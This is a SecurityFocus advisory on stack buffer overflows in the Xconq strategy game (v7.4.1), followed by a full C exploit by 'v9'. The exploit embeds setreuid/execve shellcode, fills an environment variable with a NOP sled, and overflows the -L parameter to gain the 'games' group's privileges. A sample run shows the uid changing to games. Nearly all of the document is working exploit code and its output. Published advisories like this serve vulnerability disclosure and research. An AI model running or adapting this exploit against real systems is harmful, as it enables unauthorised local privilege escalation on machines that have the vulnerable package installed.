source: http://www.securityfocus.com/bid/1495/info

Xconq is a multiple player strategy game available for many unix platforms. It contains a number of buffer overflow vulnerabilities including the ability to overflow stack buffers with either the DISPLAY or the USER environment variables. The Redhat Linux Xconq package installs the game with SGID 'games' privileges allowing an attacker to compromise the local 'games' group. 

/* (linux)xconq[v7.4.1] local buffer overflow, by:
v9[v9@fakehalo.org].  this
    will give you uid=games on systems with
xconq.  this exploit was slightly
    more work than i thought it was going to be. 
i originally wrote this
    exploit for the -g parameter.  but, via the -g
parameter you must have a
    display.  via ths -L parameter you do not need
a display, but it is much
    more exact.  in this method you have to fill
the XCONQCONFIG environmental
    variable to a certain point to be able to
overwrite the eip via the -L
    parameter.  (64 bytes is more than enough).  i
also needed to modify some
    shellcode for this.  all in all, too much work
for what it is worth.

    example(test usage):
------------------------------------------------------------------------------
bash# echo id|(id;cc xxconq.c -o xxconq;./xxconq
-5000 0 20 507)
fakehalo: uid:1000 gid:100. [euid:1000 egid:100]
[ (linux)xconq[v7.4.1] local buffer overflow, by:
v9[v9@fakehalo.org]. ]
*** [data]: addr: 0xbffffdc4, offset: -5000,
alignment: 0, uid: 20, cap: 507.
*** [data]: sizeof(bofeip): 512, sizeof(env):
4096, sizeof(push): 64, nop=3579.

              Welcome to X11 Xconq version 7.4.1
(Dec 2000)

Xconq is free software and you are welcome to
distribute copies of it
under certain conditions; type "o copying" to see
the conditions.
There is absolutely no warranty for Xconq; type "o
warranty" for details.
fakehalo: uid:20 gid:100. [euid:20 egid:100]
bash#
------------------------------------------------------------------------------

    note: built and tested on slackware.  some
other overflowable functions i
          will mention are the -g parameter and
the XCONQLIB environmental
          variable,  both of those overflows
require a display to exploit.
          this program also has an odd usage of
setuid(); in it to drop its
          privileges -- making it possible to
break.  and yes, i squished the
          code together on purpose.  why? i am a
*x80 resolution kinda guy :/.
*/
#define PATH "/usr/local/bin/xconq"     // path to
xconq7.4.1.
#define DEFAULT_ALIGN 0                 // generic
alignment.
#define DEFAULT_OFFSET -5000            // generic
offset. (from bufsize)
#define DEFAULT_UID 20                  // user id
of games.
#define DEFAULT_CAP 507                 // exact
buffer cut off point.
#define FILLER 0x78                     // filling
character, for misc use.
static char exec[]= // setreuid()+exec():
v9@fakehalo.org.

"\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x00\x31\xc0\xb0\x46\xcd\x80\x31\xdb"

"\x31\xc9\xb3\x00\xb1\x00\x31\xc0\xb0\x46\xcd\x80\xeb\x24\x5e\x8d\x1e\x89\x5e"

"\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"

"\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff\x2f\x62"
 "\x69\x6e\x2f\x73\x68\x01";
long esp(void){__asm__("movl %esp,%eax");}
int main(int argc,char **argv){
 char bofeip[512],env[4096],push[64];int
i,offset,align,uid,cap;long ret;
 printf("[ (linux)xconq[v7.4.1] local buffer
overflow, by: v9[v9@fakehalo.org]"
 ". ]\n");

if((argv[1]&&!strcmp(argv[1],"-h"))||(argv[1]&&!strcmp(argv[1],"--help"))){ 
  printf("*** [syntax]: %s [offset] [alignment]
[user id] [capoff buffer value"
  "].\n",argv[0]);
  printf("*** [required]: argument alignment value
must be: 0-3.\n");
  printf("*** [required]: argument user id value
must be: 1-255.\n");
  printf("*** [required]: argument cap value must
be: 1-%d.\n",sizeof(bofeip));
  exit(0);
 }

if(argc>1){offset=atoi(argv[1]);}else{offset=DEFAULT_OFFSET;}
 if(argc>2){
  if(atoi(argv[2])>3||atoi(argv[2])<0){
   printf("*** [error]: ignored argument alignment
value: %s. (use 0-3)\n",
   argv[2]);align=DEFAULT_ALIGN;   
  }
  else{align=atoi(argv[2]);}
 }
 else{align=DEFAULT_ALIGN;}
 if(argc>3){
  if(atoi(argv[3])<1||atoi(argv[3])>255){
   printf("*** [error]: ignored argument uid
value: %s. (use 1-255)\n",
   argv[3]);uid=DEFAULT_UID;
  }
  else{uid=atoi(argv[3]);}
 }
 else{uid=DEFAULT_UID;}
 if(argc>4){

if(atoi(argv[4])<1||atoi(argv[4])>sizeof(bofeip)){
   printf("*** [error]: ignored argument cap
value: %s. (use 1-%d)\n",argv[4],
   sizeof(bofeip));cap=DEFAULT_CAP;
  }
  else{cap=atoi(argv[4]);}
 }
 else{cap=DEFAULT_CAP;}

ret=(esp()-offset);for(i=0;i<align;i++){bofeip[i]=FILLER;}
 for(i=align;i<(sizeof(bofeip)-4);i+=4){*(long
*)&bofeip[i]=ret;}
 bofeip[cap]=0x0;

for(i=0;i<(sizeof(env)-strlen(exec)-strlen(bofeip));i++){env[i]=0x90;}

exec[10]=uid;exec[22]=uid;exec[24]=uid;memcpy(env+i,exec,strlen(exec));
 env[(i+strlen(exec))]=0x0;printf("*** [data]:
addr: 0x%lx, offset: %d, alignm"
 "ent: %d, uid: %d, cap: %d.\n*** [data]:
sizeof(bofeip): %d, sizeof(env): %d,"
 " sizeof(push): %d,
nop=%d.\n",ret,offset,align,uid,cap,sizeof(bofeip),

sizeof(env),sizeof(push),(strlen(env)-strlen((char
*)strrchr(env,0x90))+1));

setenv("EXEC",env,1);memset(push,FILLER,sizeof(push));

push[sizeof(push)]=0x0;setenv("XCONQCONFIG",push,1);
 if(execl(PATH,PATH,"-L",bofeip,0)){
  printf("*** [error]: could not execute %s
properly.\n",argv[0]);
  exit(-1);
 }
}